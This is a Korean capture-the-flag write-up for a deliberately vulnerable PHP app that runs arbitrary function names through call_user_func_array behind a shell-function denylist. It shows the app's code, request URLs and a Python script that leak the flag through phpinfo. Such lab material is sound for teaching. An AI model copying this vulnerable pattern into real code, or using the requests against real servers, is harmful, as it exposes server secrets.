# Exec Anything

# Usage
- 2024.05#1

# Concept
- PHP call_user_func_array

# Writeup

Docker 파일을 확인해보면 php 8.0에 apache 서비스로 돌고 있다.
####  Dockerfile
```docker
FROM php:8.0-apache

WORKDIR /var/www/html

COPY index.php /var/www/html/

COPY 000-default.conf /etc/apache2/sites-available/

RUN a2enmod rewrite

EXPOSE 80
```

apache conf 파일을 확인해보면 SetEnv를 통해 linux 환경변수가 아니라 apache 환경변수에 세팅해주고 있다.
####  000-default.conf

```conf
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    SetEnv flag "hspace{?}"

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

index.php에서는 disallowed_functions에 많은 필터링이 걸림을 확인할 수 있다. 일반적인 php shell commandline 함수들이 막혀있다

GET 방식으로 function_name과 args를 받고 있는데 function_name에 대한 필터링이 존재하고 인자에 대해서는 ,를 통해 배열로 인자를 넘겨서 `call_user_func_array`로 호출해주는 것을 확인할 수 있다.

`call_user_func_array` 호출한 output을 print_r해주는 것을 볼 수 있다.

####  index.php
```php
<?php
$disallowed_functions = ['system', 'eval', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open', 'fopen', 'file_get_contents', 'readfile', 'include', 'require', 'include_once', 'require_once', 'parse_ini_file', 'show_source', 'highlight_file', 'var_dump', 'print_r', 'var_export', 'debug_zval_dump', 'debug_print_backtrace', 'get_defined_vars', 'get_defined_functions', 'get_defined_constants', 'get_included_files', 'get_required_files', 'get_declared_classes', 'get_declared_interfaces', 'get_declared_traits'];

function call_user_func_safely($function_name, $params = []) {
    global $disallowed_functions;
    if (in_array($function_name, $disallowed_functions)) {
        return "Function not allowed!";
    } else {
        return call_user_func_array($function_name, $params);
    }
}

if (isset($_GET['function_name'])) {
    $func = $_GET['function_name'];
    $args = $_GET['args'] ?? '';

    $args = explode(',', $args);
    array_walk($args, function(&$item) { $item = trim($item); });
    
    $output = call_user_func_safely($func, $args);
    echo '<pre>' . print_r($output, true) . '</pre>';
} else {
    echo '<form method="get">
            Function Name: <input type="text" name="function_name" placeholder="Enter function name">
            <br>
            Arguments: <input type="text" name="args" placeholder="Comma-separated arguments">
            <br>
            <input type="submit" value="Execute">
          </form>';
}
?>
```

이 문제를 해결하려면 `phpinfo`를 통해 해결할 수 있다.
하지만 phpinfo함수에 대해 자세히 알아야한다.
`phpinfo()` 함수는 PHP의 설정과 현재 서버의 환경에 대한 광범위한 정보를 출력하는 PHP의 내장 함수다. 이 함수는 주로 디버깅과 시스템 설정 정보를 확인하는 데 사용한다. 일반적으로 argument를 주지 않고 호출할 수 있지만 여기서는 무조건 인자가 필요하다.

만약 인자를 주지 않고 실행하면 아래와 같이 오류가 발생한다. 즉, 무조건 인자를 주고 환경변수를 읽어와야한다.

http://localhost:8080/?function_name=phpinfo&args=
```
Fatal error: Uncaught TypeError: phpinfo(): Argument #1 ($flags) must be of type int, string given in /var/www/html/index.php:9 Stack trace: #0 /var/www/html/index.php(9): phpinfo('') #1 /var/www/html/index.php(20): call_user_func_safely('phpinfo', Array) #2 {main} thrown in /var/www/html/index.php on line 9

phpinfo에 대한 자세한 내용은 https://www.php.net/manual/en/function.phpinfo.php를 확인해보면 된다.
```
phpinfo() options
Name (constant)	Value	Description
INFO_GENERAL	1	The configuration line, php.ini location, build date, Web Server, System and more.
INFO_CREDITS	2	PHP Credits. See also phpcredits().
INFO_CONFIGURATION	4	Current Local and Master values for PHP directives. See also ini_get().
INFO_MODULES	8	Loaded modules and their respective settings. See also get_loaded_extensions().
INFO_ENVIRONMENT	16	Environment Variable information that's also available in $_ENV.
INFO_VARIABLES	32	Shows all predefined variables from EGPCS (Environment, GET, POST, Cookie, Server).
INFO_LICENSE	64	PHP License information. See also the » license FAQ.
INFO_ALL	-1	Shows all of the above.
```

http://localhost:8080/?function_name=phpinfo&args=-1 형태로 요청하게되면 Apache Environment에 flag 환경변수가 세팅되어있음을 확인할 수 있다.

http://localhost:8080/?function_name=phpinfo&args=-8 형태로 phpinfo(8); 을 호출해도 확인이 가능하다.


#### ex.py
```python
import requests

url = "http://localhost:8080/?function_name=phpinfo&args=8"
r = requests.get(url)

flag_idx = r.text.index("hspace")
print(r.text[flag_idx:flag_idx+40])
```